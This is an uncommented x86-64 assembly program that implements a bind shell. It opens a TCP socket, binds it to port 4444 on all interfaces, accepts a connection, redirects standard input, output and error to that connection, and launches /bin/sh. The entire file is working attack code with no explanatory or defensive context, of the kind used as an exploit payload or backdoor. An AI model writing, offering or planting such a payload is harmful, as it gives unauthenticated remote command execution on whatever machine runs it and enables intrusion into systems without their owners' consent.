BITS 64

section .data
binsh db '/bin/sh',0

section .text

global _start
_start:

mov rax, 0x29
mov rdi, 2
mov rsi, 1
mov rdx, 0
syscall

mov r12, rax

sub rsp, 16

mov word [rsp], 2
mov word [rsp+2], 0x5c11
mov dword [rsp+4], 0
mov qword [rsp+8], 0

mov rax, 0x31
mov rdi, r12
mov rsi, rsp
mov rdx, 16
syscall

mov rax, 0x32
mov rdi, r12
mov rsi, 5
syscall

mov rax, 0x2b
mov rdi, r12
mov rsi, 0
mov rdx, 0
syscall

mov r13, rax

mov rax, 0x21
mov rdi, r13
mov rsi, 0
syscall

mov rax, 0x21
mov rdi, r13
mov rsi, 1
syscall

mov rax, 0x21
mov rdi, r13
mov rsi, 2
syscall

mov rax, 0x3b
mov rdi, binsh
mov rsi, 0
mov rdx, 0
syscall


mov rax,60
mov rdi,0
syscall
